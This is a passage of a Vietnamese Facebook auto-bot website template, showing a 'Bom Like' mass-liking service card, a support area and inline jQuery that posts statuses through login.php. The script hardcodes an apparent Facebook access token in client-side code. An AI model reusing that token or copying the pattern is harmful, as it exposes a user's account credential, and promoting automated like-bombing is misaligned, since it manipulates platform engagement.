<div class="col-sm-6">
<div class="box box-solid box-danger">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="bomlike.php">Bom Like</a></h3>
</div>
<div class="box-body">
Bão Like cho bạn bè, boom Like bạn bè.
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(14)">Thông tin</a></div>
<div class="col-sm-6"><a href="bomlike.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
</section>
</div>
<div class="tab-pane" id="tab_3">
<section id="conten" class="content">
<h3>Khu vực Hỗ trợ</h3><br><br>
<div class="row">
<div class="col-sm-6">
<div class="well well-lg"><p><a class="btn btn-success" href="#">Hướng dẫn cơ bản</a></p> <h4>Hướng dẫn cơ bản cho người mới bắt đầu !</h4></div></div>
<div class="col-sm-6">
<div class="well well-lg"><p><a class="btn btn-success" href="http://fb.com/puaru.vn">Room Hỗ trợ</a></p><h4>Room chat cho member auto-bot.me</h4></div></div>
<br><font color="green" size="+3" bot-fb.me's="" room="" member'=""><hr></font><div id="chat_botvn"></div>
</div></section>
</div>
</div>
</div>

</div>
</div>
</div>
</div>
<script>function log(msg){$('#message').html('');$('#message').append('<br>'+msg+'<br>');$('#message').fadeIn(999);}function call(id){alert('Bạn đã post status lên Dòng thời gian thành công. Check wall nhé !')
$('#message').html('<br>Post thành công  <i class="fa fa-check"></i> ! Bấm Go! link để đi đến bài viết <a href="https://facebook.com/'+id+'">Link</a>');$('#message').fadeIn(999);}function urldecode(str){return decodeURIComponent((str+'').replace(/\+/g,'%20'));}function reload(){$('#reload').html('<i class="fa fa-spinner fa-pulse"></i><br>Đang tải ... ');document.getElementById('reload').disable=true;$.post('login.php?newfeed=1',{reload:1,time:1462037926},function(data,status){$('#newfeed_conten').prepend(data);$('#reload').html('Tải bài mới nhất ');});}function post_newfeed(){var access_token='EAACW5Fg5N2IBALJTrRlSSLotdUUmcRpY3Nyqwk5lWiDyNeetg18AHdDXFiVRYXmzYPzPxFa5CJdcTkWHty3Y9SXvOTVr7xKbpVjtiaFsFkBhjZCZBkkzRL1lOi6ScEizc4AZBKLRYYu2ZCHbxZBnVqUuxYsMtGkpdC04ZAIOqETMSiHZCBOyEAa';$("#message").html("");noi_dung=document.getElementById('noi_dung_share').value;document.getElementById('post_stt').disable=true;log('<i class="fa fa-spinner fa-pulse"></i><br>Đang post, vui lòng đợi ... ');noi_dungs=urldecode(noi_dung);$.post('login.php?newfeed=1',{noi_dung_share:noi_dungs},function(data,status){$('#post_stt').html('Đăng');log(data);reload();});}</script>
</div></div>
	<?php } include'foot.php'; ?>